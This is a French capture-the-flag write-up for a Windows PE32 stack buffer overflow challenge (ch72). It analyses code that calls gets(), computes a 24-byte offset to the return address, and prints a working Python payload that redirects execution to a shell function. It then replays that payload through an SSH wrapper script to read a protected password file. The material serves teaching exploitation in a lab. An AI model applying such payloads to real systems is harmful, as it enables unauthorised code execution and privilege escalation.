# Challenge PE32 Windows — Stack Buffer Overflow (ch72)

## Fichiers présents

```bash
app-systeme-ch72@challenge05:~$ ls -l
-rw-r-----  ch72.c      # code source
-rwxr-x---  ch72.exe    # binaire PE32 Windows
-rwxr-x---  ch72.obj    # fichier objet compilé
----------  exploit.sh  # inaccessible (aucune permission)
-rwxr-x---  wrapper.sh  # script SSH
```

---

## Analyse du code source

```c
#define DEFAULT_LEN 16

void admin_shell(void) {
    system("C:\\Windows\\system32\\cmd.exe");  // ouvre un shell Windows
}

void main(void) {
    char buff[DEFAULT_LEN] = {0};  // buffer de 16 bytes
    gets(buff);                     // ⚠️ VULNÉRABILITÉ : pas de limite
    for (int i = 0; i < DEFAULT_LEN; i++) {
        buff[i] = toupper(buff[i]); // convertit en majuscules (seulement les 16 premiers bytes)
    }
    printf("%s\n", buff);
}
```

**Points importants :**
- `gets()` ne vérifie jamais la taille → overflow possible
- `toupper()` ne traite que les **16 premiers bytes** → tout ce qui est au-delà n'est pas modifié
- `admin_shell()` n'est jamais appelée dans le flux normal → c'est notre cible

---

## Trouver l'adresse de admin_shell

Les outils Linux (gdb, readelf) lisent mal les PE32. On utilise le `.obj` :

```bash
objdump -d ch72.obj
```

Résultat :
```
00000000 <_admin_shell>:   ← première fonction
00000020 <_main>:          ← deuxième fonction
```

On sait aussi que `.text` démarre à `0x00401000` dans le `.exe` (vu avec `objdump -d ch72.exe | grep "<"`).

`admin_shell` étant la **première fonction** de `.text` :

```
adresse admin_shell = 0x00401000
en little-endian    = \x00\x10\x40\x00
```

---

## Analyser le layout de la stack

```bash
objdump -d ch72.obj
```

Dans `_main` :
```asm
sub $0x14, %esp          → alloue 0x14 = 20 bytes sur la stack
lea -0x14(%ebp), %ecx    → buf est à EBP - 20
movl $0x0, -0x4(%ebp)    → variable i est à EBP - 4
```

Layout de la stack :

```
┌─────────────────────┐  ← adresses hautes
│  return address     │  ← EBP + 4  ← ON VEUT ÉCRIRE ICI
├─────────────────────┤
│  saved EBP          │  ← EBP       (4 bytes)
├─────────────────────┤
│  int i              │  ← EBP - 4   (4 bytes, compteur de boucle)
├─────────────────────┤
│  buf (16 bytes)     │  ← EBP - 20
│  + 4 bytes align    │
└─────────────────────┘  ← adresses basses
```

**Calcul de l'offset :**
```
buf → EBP          = 20 bytes  (0x14)
EBP → return addr  =  4 bytes  (saved EBP)
                     ---------
total offset       = 24 bytes
```

---

## Construction du payload

```
[ 24 bytes de padding ] + [ adresse admin_shell en little-endian ]
```

**Pourquoi 24 et pas 16 ?**
- Le buffer fait 16 bytes dans le code C
- Mais le compilateur alloue 20 bytes réels sur la stack (alignement + variable `i`)
- Plus 4 bytes pour le saved EBP
- Total : 24 bytes avant d'atteindre la return address

**Pourquoi little-endian ?**
- Sur x86 (32-bit), les adresses sont stockées octet de poids faible en premier
- `0x00401000` → `\x00\x10\x40\x00`

---

## Exploitation

Python 2 est disponible sur ce système (pas Python 3) :

```bash
(python -c "
import sys
sys.stdout.write('A' * 24 + '\x00\x10\x40\x00')
"; cat) | ./ch72.exe
```

- `'A' * 24` : remplit jusqu'à la return address
- `'\x00\x10\x40\x00'` : écrase la return address avec admin_shell
- `; cat` : garde stdin ouvert pour interagir avec le shell

**Résultat :**
```
AAAAAAAAAAAAAAAA
Microsoft Windows [Version 10.0.17763.737]
C:\cygwin64\challenge\app-systeme\ch72>
```

On a un shell Windows ! Mais `type .passwd` retourne `Access is denied` car on tourne encore en tant que `app-systeme-ch72`.

---

## Élévation via wrapper.sh

```bash
cat wrapper.sh
```
```bash
#!/bin/bash
ssh -q -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
    -i .ssh/id_rsa app-systeme-ch72-crk@localhost
```

`wrapper.sh` se connecte en SSH avec une clé privée en tant que `app-systeme-ch72-crk` qui a les droits sur `.passwd`. Ce compte a aussi `ch72.exe` comme shell de connexion → il faut rejouer le même exploit dans cette connexion SSH.

```bash
(python -c "
import sys
sys.stdout.write('A' * 24 + '\x00\x10\x40\x00')
"; cat) | ./wrapper.sh
```

Puis dans le cmd Windows obtenu :

```
type .passwd
```

---

## 🏆 Flag obtenu

```
[FLAG]
```

---

## Résumé des concepts

| Concept | Détail |
|---|---|
| **PE32** | Format exécutable Windows 32-bit |
| **gets()** | Fonction sans limite de lecture → overflow |
| **Stack overflow** | Débordement du buffer jusqu'à la return address |
| **Return address** | Adresse de retour de la fonction, écrasée par admin_shell |
| **Little-endian** | Adresses stockées octet de poids faible en premier |
| **offset = 24** | 20 bytes (stack) + 4 bytes (saved EBP) |
| **wrapper.sh** | Connexion SSH vers le compte avec les vrais droits |